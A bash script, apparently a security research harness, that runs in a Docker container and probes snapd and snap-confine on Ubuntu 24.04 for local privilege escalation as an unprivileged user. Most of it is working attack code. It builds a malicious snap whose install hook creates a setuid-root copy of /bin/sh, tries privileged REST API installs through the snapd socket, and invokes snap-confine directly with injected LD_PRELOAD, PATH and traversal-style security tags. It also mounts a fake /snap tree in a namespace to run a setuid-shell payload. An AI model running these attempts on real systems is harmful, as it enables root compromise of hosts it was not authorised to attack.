#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/snapd-current-default-deep-20260517.out}"

mkdir -p "$(dirname -- "$LOG")"
: >"$LOG"
exec > >(tee -a "$LOG") 2>&1

run_host() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

echo "snapd/snap-confine current default trust-boundary probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run_host docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail
export LC_ALL=C

ATTACKER=attacker
WORK=/tmp/snapd-current-default-deep
SRCROOT=/tmp/snapd-current-default-deep-src
SNAP_SRC=$WORK/snap-src
SNAP_FILE=/tmp/snapd-current-default-deep-lpe_1.0_all.snap
ROOT_MARKER=/root/snapd_current_default_deep_root_marker
TMP_MARKER=/tmp/snapd_current_default_deep_tmp_marker
SUID_MARKER=/tmp/snapd_current_default_deep_suid_sh

section() {
  printf '\n## %s\n' "$1"
}

run() {
  local label="$1"
  shift
  section "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  set +e
  "$@" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

run_sh() {
  local label="$1"
  local script="$2"
  section "$label"
  printf '$ bash -lc %q\n' "$script"
  set +e
  bash -lc "$script" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

run_attacker() {
  local label="$1"
  local script="$2"
  section "$label"
  printf '$ runuser -u %q -- bash -lc %q\n' "$ATTACKER" "$script"
  set +e
  runuser -u "$ATTACKER" -- bash -lc "$script" 2>&1
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
}

curl_req() {
  local label="$1"
  local socket="$2"
  local method="$3"
  local path="$4"
  local body="${5:-}"
  shift 5 || true
  section "$label"
  printf 'socket=%s method=%s path=%s body=%s\n' "$socket" "$method" "$path" "$body"
  set +e
  if [[ -n "$body" ]]; then
    printf '%s' "$body" > "$WORK/body.json"
    chown "$ATTACKER:$ATTACKER" "$WORK/body.json"
    runuser -u "$ATTACKER" -- curl --max-time 12 -sS -i --unix-socket "$socket" \
      -H 'Content-Type: application/json' "$@" -X "$method" --data-binary @"$WORK/body.json" \
      "http://localhost$path" | sed -n '1,90p'
    local rc=${PIPESTATUS[0]}
  else
    runuser -u "$ATTACKER" -- curl --max-time 12 -sS -i --unix-socket "$socket" \
      "$@" -X "$method" "http://localhost$path" | sed -n '1,90p'
    local rc=${PIPESTATUS[0]}
  fi
  set -e
  printf 'rc=%s\n' "$rc"
}

root_proof_check() {
  section "$1"
  local proof=no
  for f in "$ROOT_MARKER" "$TMP_MARKER" "$SUID_MARKER"; do
    if [[ -e "$f" ]]; then
      proof=yes
      stat -c '%A %a %U:%G %u:%g %s %n' "$f" 2>&1 || true
      sed -n '1,40p' "$f" 2>&1 || true
    else
      printf 'MISSING %s\n' "$f"
    fi
  done
  if [[ "$proof" == yes ]]; then
    echo "ROOT_PROOF_CANDIDATE=YES"
  else
    echo "ROOT_PROOF_CANDIDATE=NO"
  fi
}

cleanup() {
  set +e
  snap remove snapd-current-default-deep-lpe >/dev/null 2>&1 || true
  rm -rf "$WORK" "$SRCROOT"
  rm -f "$SNAP_FILE" "$ROOT_MARKER" "$TMP_MARKER" "$SUID_MARKER"
  rm -rf /tmp/scd-data /tmp/scd-common /tmp/scd-user-data /tmp/scd-user-common /tmp/scd-fake-snap /tmp/scd-fakebin
  rm -f /tmp/scd-hardlink /tmp/scd-copy /tmp/scd-preload.so /tmp/scd-userns-owner-proof
  rm -f /run/snapd/lock/scd*.lock /run/snapd/lock/scclassic.lock 2>/dev/null || true
}

trap cleanup EXIT

section "pre-clean"
cleanup
mkdir -p "$WORK"
chmod 755 "$WORK"
chown "$ATTACKER:$ATTACKER" "$WORK"

section "default package, service, socket, snap state"
sed -n '1,10p' /etc/os-release
uname -a
id
id "$ATTACKER"
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\n' \
  snapd squashfs-tools apparmor policykit-1 polkitd dbus systemd curl jq strace 2>&1 | sort || true
apt-cache policy snapd 2>&1 | sed -n '1,40p' || true
snap version 2>&1 || true
snap list --all 2>&1 || true
run "attacker snap list" runuser -u "$ATTACKER" -- snap list --all
systemctl is-active snapd.service snapd.socket snapd.seeded.service 2>&1 || true
systemctl is-enabled snapd.service snapd.socket snapd.seeded.service 2>&1 || true
systemctl status --no-pager -l snapd.service snapd.socket snapd.seeded.service 2>&1 | sed -n '1,90p' || true
systemctl show snapd.autoimport.service snapd.snap-repair.timer -p Id -p ActiveState -p SubState -p ConditionResult 2>&1 || true
printf '\n[snapd packaged units]\n'
systemctl cat snapd.socket snapd.service snapd.autoimport.service snapd.snap-repair.timer 2>&1 | sed -n '1,180p' || true
printf '\n[relevant modes and capabilities]\n'
stat -Lc '%A %a %U:%G %u:%g %n' \
  /run/snapd.socket /run/snapd-snap.socket /usr/lib/snapd/snap-confine /usr/lib/snapd/snap-update-ns \
  /usr/lib/snapd/snap-discard-ns /snap /var/lib/snapd /var/lib/snapd/snaps /run/snapd /run/snapd/ns /run/snapd/lock \
  /var/snap 2>&1 || true
getcap -v /usr/lib/snapd/snap-confine /usr/lib/snapd/snap-update-ns /usr/lib/snapd/snap-discard-ns 2>&1 || true
printf '\n[apparmor status]\n'
aa-status 2>&1 | sed -n '1,80p' || true
printf '\n[polkit snapd policy]\n'
nl -ba /usr/share/polkit-1/actions/io.snapcraft.snapd.policy | sed -n '1,80p' || true
printf '\n[snap-confine packaged AppArmor profile highlights]\n'
nl -ba /etc/apparmor.d/usr.lib.snapd.snap-confine.real 2>/dev/null | \
  sed -n '1,20p;72,80p;133,158p;173,198p;480,524p;600,641p' || true

section "default snapd directories and attacker writable paths"
find /run/snapd /var/lib/snapd /var/snap /snap /usr/lib/snapd -maxdepth 3 -xdev \
  -printf '%M %u:%g %p -> %l\n' 2>&1 | sort | sed -n '1,220p' || true
run_attacker "attacker writable search under snapd state" \
  'find /run/snapd /var/lib/snapd /var/snap /snap /usr/lib/snapd -xdev \( -writable -o -perm -0002 -o -perm -0020 \) -printf "%M %u:%g %p -> %l\n" 2>/dev/null | sort | sed -n "1,160p"'
run_attacker "attacker direct write/symlink/hardlink probes in root-owned snapd paths" '
for d in /run/snapd /run/snapd/lock /run/snapd/ns /var/lib/snapd /var/lib/snapd/snaps /var/lib/snapd/mount /var/lib/snapd/seccomp /snap /var/snap; do
  printf "touch %-35s -> " "$d/scd_touch"
  touch "$d/scd_touch" 2>&1
  echo "rc=$?"
  rm -f "$d/scd_touch" 2>/dev/null || true
done
ln -s /root/scd-symlink-target /run/snapd/lock/scd-symlink.lock 2>&1
printf "symlink_rc=%s\n" "$?"
ln /usr/lib/snapd/snap-confine /tmp/scd-hardlink 2>&1
printf "hardlink_rc=%s\n" "$?"
ls -ln /tmp/scd-hardlink 2>&1 || true
'

section "current source acquisition and trust-boundary code review"
if [[ ! -d /tmp/snapd-current-src/snapd-2.74.1+ubuntu24.04.4 ]]; then
  rm -rf "$SRCROOT"
  mkdir -p "$SRCROOT"
  (cd "$SRCROOT" && apt-get -qq source snapd)
  SRCDIR="$(find "$SRCROOT" -maxdepth 1 -type d -name 'snapd-*' | head -n1)"
else
  SRCDIR=/tmp/snapd-current-src/snapd-2.74.1+ubuntu24.04.4
fi
echo "SRCDIR=$SRCDIR"
(cd "$SRCDIR" && dpkg-parsechangelog -S Version 2>/dev/null || true)
printf '\n[access.go: polkit/ucred/socket gate]\n'
nl -ba "$SRCDIR/daemon/access.go" | sed -n '50,72p;133,175p;178,235p;484,520p'
printf '\n[ucrednet.go: peer credentials]\n'
nl -ba "$SRCDIR/daemon/ucrednet.go" | sed -n '147,180p'
printf '\n[API command access highlights]\n'
nl -ba "$SRCDIR/daemon/api_general.go" | sed -n '50,75p;92,99p'
nl -ba "$SRCDIR/daemon/api_snaps.go" | sed -n '62,89p'
nl -ba "$SRCDIR/daemon/api_snap_conf.go" | sed -n '38,45p'
nl -ba "$SRCDIR/daemon/api_asserts.go" | sed -n '35,48p'
nl -ba "$SRCDIR/daemon/api_snapctl.go" | sed -n '34,75p'
nl -ba "$SRCDIR/daemon/api_debug.go" | sed -n '41,52p'
nl -ba "$SRCDIR/daemon/api_notices.go" | sed -n '41,49p;252,315p'
printf '\n[snap-confine invocation/env/helper/mount/seccomp snippets]\n'
nl -ba "$SRCDIR/cmd/snap-confine/snap-confine-invocation.c" | sed -n '30,100p'
nl -ba "$SRCDIR/cmd/snap-confine/snap-confine.c" | sed -n '325,365p;366,420p;483,490p;551,585p;785,818p;1018,1064p'
nl -ba "$SRCDIR/cmd/libsnap-confine-private/tool.c" | sed -n '77,101p;167,197p;236,253p'
nl -ba "$SRCDIR/cmd/snap-confine/mount-support.c" | sed -n '507,524p;1019,1036p'
nl -ba "$SRCDIR/cmd/snap-confine/ns-support.c" | sed -n '205,212p;553,566p;603,610p'
nl -ba "$SRCDIR/cmd/snap-confine/seccomp-support.c" | sed -n '73,89p;198,236p'
printf '\n[atomic and lock helpers]\n'
nl -ba "$SRCDIR/osutil/flock.go" | sed -n '35,70p'
nl -ba "$SRCDIR/osutil/io.go" | sed -n '82,105p;187,194p;236,250p'

section "REST endpoint inventory reachable by uid1001"
run_attacker "GET / on snapd socket" \
  'curl --max-time 8 -sS -i --unix-socket /run/snapd.socket http://localhost/ | sed -n "1,40p"'
run_attacker "GET /v2/debug?aspect=features endpoint list on snapd socket" \
  'curl --max-time 15 -sS --unix-socket /run/snapd.socket "http://localhost/v2/debug?aspect=features" | jq -r ".result.endpoints[] | [.method,.path,((.actions//[])|join(\",\"))] | @tsv" | sed -n "1,140p"'

curl_req "GET /v2/system-info" /run/snapd.socket GET /v2/system-info ""
curl_req "GET /v2/snaps" /run/snapd.socket GET /v2/snaps ""
curl_req "GET /v2/find?name=core24" /run/snapd.socket GET '/v2/find?name=core24' ""
curl_req "GET /v2/interfaces" /run/snapd.socket GET /v2/interfaces ""
curl_req "GET /v2/connections" /run/snapd.socket GET /v2/connections ""
curl_req "GET /v2/changes" /run/snapd.socket GET /v2/changes ""
curl_req "GET /v2/apps?select=service" /run/snapd.socket GET '/v2/apps?select=service' ""
curl_req "GET /v2/model" /run/snapd.socket GET /v2/model ""
curl_req "GET /v2/system-info/storage-encrypted" /run/snapd.socket GET /v2/system-info/storage-encrypted ""
curl_req "GET /v2/quotas" /run/snapd.socket GET /v2/quotas ""
curl_req "GET /v2/notices" /run/snapd.socket GET /v2/notices ""
curl_req "GET /v2/assertions" /run/snapd.socket GET /v2/assertions ""
curl_req "GET /v2/users" /run/snapd.socket GET /v2/users ""
curl_req "GET /v2/logs should auth-gate" /run/snapd.socket GET /v2/logs ""
curl_req "GET /v2/system-recovery-keys should auth/root-gate" /run/snapd.socket GET /v2/system-recovery-keys ""
curl_req "GET /v2/confdb arbitrary view should auth-gate" /run/snapd.socket GET /v2/confdb/test/test/view ""

section "build local attacker snap with root marker install hook"
install -d -o "$ATTACKER" -g "$ATTACKER" "$SNAP_SRC/meta/hooks" "$SNAP_SRC/bin"
cat > "$SNAP_SRC/meta/snap.yaml" <<'EOF'
name: snapd-current-default-deep-lpe
version: "1.0"
summary: current snapd default LPE probe
description: Marker snap used only to test whether default uid1001 paths reach root hook execution.
base: core24
grade: stable
confinement: strict
apps:
  marker:
    command: bin/marker
EOF
cat > "$SNAP_SRC/bin/marker" <<'EOF'
#!/bin/sh
id
EOF
cat > "$SNAP_SRC/meta/hooks/install" <<EOF
#!/bin/sh
{
  echo hook=install
  date -u +%Y-%m-%dT%H:%M:%SZ
  id
  env | sort
} > "$ROOT_MARKER"
chmod 0600 "$ROOT_MARKER"
{
  echo tmp-marker
  id
} > "$TMP_MARKER"
cp /bin/sh "$SUID_MARKER" && chmod 4755 "$SUID_MARKER"
EOF
chmod 755 "$SNAP_SRC/bin/marker" "$SNAP_SRC/meta/hooks/install"
chown -R "$ATTACKER:$ATTACKER" "$SNAP_SRC"
run "snap pack as attacker" runuser -u "$ATTACKER" -- snap pack "$SNAP_SRC" /tmp
stat -c '%A %a %U:%G %s %n' "$SNAP_FILE" "$SNAP_SRC/meta/hooks/install" 2>&1 || true

section "privileged REST and CLI mutation attempts as uid1001"
curl_req "POST /v2/snaps install store snap" /run/snapd.socket POST /v2/snaps '{"action":"install","snaps":["hello-world"]}' -H 'X-Allow-Interaction: true'
curl_req "POST /v2/snaps install local snap-path JSON" /run/snapd.socket POST /v2/snaps "{\"action\":\"install\",\"snap-path\":\"$SNAP_FILE\",\"dangerous\":true}" -H 'X-Allow-Interaction: true'
section "POST /v2/snaps multipart dangerous local snap"
set +e
runuser -u "$ATTACKER" -- curl --max-time 20 -sS -i --unix-socket /run/snapd.socket \
  -H 'X-Allow-Interaction: true' -F action=install -F dangerous=true -F "snap=@$SNAP_FILE" \
  http://localhost/v2/snaps | sed -n '1,100p'
printf 'rc=%s\n' "${PIPESTATUS[0]}"
set -e
run_attacker "snap install --dangerous local snap" "snap install --dangerous '$SNAP_FILE' 2>&1"
run_attacker "snap try attacker snap tree" "snap try '$SNAP_SRC' 2>&1"
curl_req "POST /v2/interfaces connect" /run/snapd.socket POST /v2/interfaces '{"action":"connect","slots":[{"snap":"core","slot":"network"}],"plugs":[{"snap":"hello-world","plug":"network"}]}' -H 'X-Allow-Interaction: true'
curl_req "PUT /v2/snaps/system/conf env-like values" /run/snapd.socket PUT /v2/snaps/system/conf '{"SNAPD_DEBUG":"1","experimental.parallel-instances":true}' -H 'X-Allow-Interaction: true'
curl_req "POST /v2/assertions invalid assertion" /run/snapd.socket POST /v2/assertions 'not-an-assertion'
curl_req "POST /v2/debug add-warning" /run/snapd.socket POST /v2/debug '{"action":"add-warning","message":"uid1001-probe"}'
curl_req "POST /v2/system-info open write but invalid system key" /run/snapd.socket POST /v2/system-info '{"action":"advise-system-key-mismatch"}'
curl_req "POST /v2/notices add snap-run-inhibit from curl process" /run/snapd.socket POST /v2/notices '{"action":"add","type":"snap-run-inhibit","key":"hello-world"}'
curl_req "POST /v2/warnings okay" /run/snapd.socket POST /v2/warnings '{"action":"okay","timestamp":"1970-01-01T00:00:00Z"}' -H 'X-Allow-Interaction: true'
curl_req "POST /v2/aliases alias" /run/snapd.socket POST /v2/aliases '{"action":"alias","snap":"hello-world","app":"hello-world","alias":"hw"}' -H 'X-Allow-Interaction: true'
curl_req "POST /v2/apps start" /run/snapd.socket POST /v2/apps '{"action":"start","names":["hello-world"]}' -H 'X-Allow-Interaction: true'
curl_req "POST /v2/quotas ensure" /run/snapd.socket POST /v2/quotas '{"action":"ensure","group-name":"scd","constraints":{"memory":1048576}}'
curl_req "POST /v2/model invalid" /run/snapd.socket POST /v2/model 'garbage'
curl_req "POST /v2/systems install-like" /run/snapd.socket POST /v2/systems '{"action":"install","label":"scd"}'
root_proof_check "after REST/CLI mutation attempts"

section "snapd-snap.socket peer validation as uid1001"
curl_req "GET /v2/system-info on snapd-snap.socket" /run/snapd-snap.socket GET /v2/system-info ""
curl_req "GET /v2/system-info on snapd-snap.socket with spoof headers" /run/snapd-snap.socket GET /v2/system-info "" -H 'X-Snapd-Snap: core' -H 'X-Snapd-Context: spoof'
curl_req "POST /v2/snapctl get outside snap" /run/snapd-snap.socket POST /v2/snapctl '{"context-id":"bogus","args":["get","system"]}'
curl_req "POST /v2/snapctl set outside snap" /run/snapd-snap.socket POST /v2/snapctl '{"context-id":"bogus","args":["set","system.probe=true"]}'

section "snap-confine direct default, env, tag, and helper probes"
SCD_ENV='PATH=/tmp/scd-fakebin:/usr/bin:/bin SNAPD_DEBUG=1 SNAP_CONFINE_MAX_PROFILE_WAIT=1 LD_PRELOAD=/tmp/scd-preload.so LD_LIBRARY_PATH=/tmp SNAP_MOUNT_DIR=/tmp/scd-fake-snap SNAP_NAME=scd SNAP_INSTANCE_NAME=scd SNAP_REVISION=1 SNAP_COOKIE=scd-cookie SNAP_CONTEXT=scd-context SNAP_DATA=/tmp/scd-data SNAP_COMMON=/tmp/scd-common SNAP_USER_DATA=/tmp/scd-user-data SNAP_USER_COMMON=/tmp/scd-user-common'
run_attacker "direct snap-confine strict default reaches missing base before payload" \
  "timeout -k 1s 8s env -i $SCD_ENV /usr/lib/snapd/snap-confine snap.scd.app /bin/id 2>&1 | sed -n '1,160p'; printf 'direct_rc=%s\n' \"\${PIPESTATUS[0]}\""
run_attacker "direct snap-confine --base core24 still requires default root-owned /snap base" \
  "timeout -k 1s 8s env -i $SCD_ENV /usr/lib/snapd/snap-confine --base core24 snap.scd.app /bin/id 2>&1 | sed -n '1,160p'; printf 'base_rc=%s\n' \"\${PIPESTATUS[0]}\""
run_attacker "direct snap-confine --classic waits for missing root-owned seccomp profile, no exec" \
  "timeout -k 1s 8s env -i $SCD_ENV /usr/lib/snapd/snap-confine --classic snap.scd.app /bin/sh -p -c 'id; touch $ROOT_MARKER; cp /bin/sh $SUID_MARKER && chmod 4755 $SUID_MARKER' 2>&1 | sed -n '1,180p'; printf 'classic_rc=%s\n' \"\${PIPESTATUS[0]}\""
run_attacker "security tag validation rejects traversal/malformed names" \
  "for tag in 'snap.scd/../../tmp.x' 'snap..app' 'snap.scd..app' 'snap.scd_../../x.app' 'snap.scd.hook.configure'; do echo --- \$tag; timeout -k 1s 5s env -i $SCD_ENV /usr/lib/snapd/snap-confine \"\$tag\" /bin/id 2>&1 | sed -n '1,40p'; echo tag_rc=\${PIPESTATUS[0]}; done"
run_attacker "direct namespace helpers lack inherited privileged caps" \
  '/usr/lib/snapd/snap-update-ns scd 2>&1; printf "update_ns_rc=%s\n" "$?"; /usr/lib/snapd/snap-discard-ns scd 2>&1; printf "discard_ns_rc=%s\n" "$?"'
root_proof_check "after direct snap-confine probes"

section "fake namespace/base attempts stay namespace-scoped"
run_attacker "prepare fake snap/base/state tree under attacker-owned /tmp" '
set -e
BASE=/tmp/snapd-current-default-deep/fake
mkdir -p "$BASE"/{fake-snap/core/1/meta,fake-snap/snapd/1/meta,fake-snap/scd/1/meta,fake-snap/scd/1/bin,fake-var-lib-snapd/mount,fake-run-snapd/lock,fake-run-snapd/ns}
ln -sfn 1 "$BASE/fake-snap/core/current"
ln -sfn 1 "$BASE/fake-snap/snapd/current"
ln -sfn 1 "$BASE/fake-snap/scd/current"
cat > "$BASE/fake-snap/core/1/meta/snap.yaml" <<EOF
name: core
type: base
version: "16"
EOF
cat > "$BASE/fake-snap/snapd/1/meta/snap.yaml" <<EOF
name: snapd
type: snapd
version: "2.74.1"
EOF
cat > "$BASE/fake-snap/scd/1/meta/snap.yaml" <<EOF
name: scd
base: core
version: "1"
confinement: strict
apps:
  app:
    command: bin/payload.sh
EOF
cat > "$BASE/fake-snap/scd/1/bin/payload.sh" <<EOF
#!/bin/sh
id > /tmp/snapd_current_default_deep_tmp_marker
touch /root/snapd_current_default_deep_root_marker
cp /bin/sh /tmp/snapd_current_default_deep_suid_sh && chmod 4755 /tmp/snapd_current_default_deep_suid_sh
EOF
chmod 755 "$BASE/fake-snap/scd/1/bin/payload.sh"
cat > "$BASE/fake-var-lib-snapd/mount/snap.scd.fstab" <<EOF
$BASE/fake-snap/scd/1 /snap/scd/1 none bind,ro 0 0
EOF
find "$BASE" -maxdepth 5 -printf "%M %u:%g %p -> %l\n" | sort | sed -n "1,160p"
'
run_attacker "user namespace root ownership is uid1001 on host" \
  'unshare -Ur sh -c '"'"'id; printf "uid_map="; tr "\n" ";" </proc/self/uid_map; echo; echo ns-root > /tmp/scd-userns-owner-proof; ls -ln /tmp/scd-userns-owner-proof'"'"' 2>&1; echo outside; ls -ln /tmp/scd-userns-owner-proof 2>&1 || true'
run_attacker "user+mount+pid namespace with fake /snap /var/lib/snapd /run/snapd" '
BASE=/tmp/snapd-current-default-deep/fake
timeout -k 2s 10s env BASE="$BASE" unshare -Urmpf --mount-proc bash -lc '"'"'
set +e
id
printf "uid_map="
tr "\n" ";" </proc/self/uid_map
echo
mount --make-rprivate / 2>/dev/null || true
mount --bind "$BASE/fake-snap" /snap; echo bind_snap_rc=$?
mount --bind "$BASE/fake-var-lib-snapd" /var/lib/snapd; echo bind_varlib_rc=$?
mount --bind "$BASE/fake-run-snapd" /run/snapd; echo bind_run_rc=$?
findmnt /snap /var/lib/snapd /run/snapd || true
env -i PATH=/usr/bin:/bin SNAPD_DEBUG=1 SNAP_CONFINE_MAX_PROFILE_WAIT=1 SNAP_NAME=scd SNAP_INSTANCE_NAME=scd SNAP_REVISION=1 SNAP_COOKIE=scd-cookie SNAP_DATA=/tmp/scd-data SNAP_COMMON=/tmp/scd-common SNAP_USER_DATA=/tmp/scd-user-data SNAP_USER_COMMON=/tmp/scd-user-common /usr/lib/snapd/snap-confine snap.scd.app /snap/scd/current/bin/payload.sh 2>&1
echo ns_snap_confine_rc=$?
'"'"' 2>&1 | sed -n "1,240p"
printf "outer_rc=%s\n" "${PIPESTATUS[0]}"
'
root_proof_check "after namespace fake-base attempts"

section "default snap hooks and helpers reachable by uid1001"
find /snap /var/snap /var/lib/snapd/snaps /var/lib/snapd/seed -maxdepth 5 -xdev \
  -printf '%M %u:%g %p -> %l\n' 2>&1 | sort | sed -n '1,220p' || true
find /usr/lib/snapd -maxdepth 1 -type f -perm /111 -printf '%M %u:%g %p\n' | sort || true
run_attacker "user-invokable snap helpers without installed snaps" \
  'snap version 2>&1; snap debug sandbox-features 2>&1 | sed -n "1,80p"; snap run not-installed 2>&1; snap auto-import 2>&1; snap known account 2>&1 | sed -n "1,40p"'

section "final cleanup and health"
root_proof_check "pre-clean final proof check"
if [[ -e "$ROOT_MARKER" || -e "$SUID_MARKER" ]]; then
  echo "FINAL_ROOT_PROOF=YES"
else
  echo "FINAL_ROOT_PROOF=NO"
fi
cleanup
systemctl is-active snapd.socket snapd.service snapd.seeded.service 2>&1 || true
snap list --all 2>&1 || true
find /run/snapd/lock -maxdepth 1 -name 'scd*' -printf '%M %u:%g %p\n' 2>&1 || true
ls -ld "$WORK" "$SRCROOT" "$ROOT_MARKER" "$TMP_MARKER" "$SUID_MARKER" /tmp/scd-userns-owner-proof 2>&1 || true
find /tmp -maxdepth 1 \( -name 'snapd-current-default-deep*' -o -name 'scd-*' \) -printf '%M %u:%g %p\n' 2>&1 || true

TARGET_SCRIPT
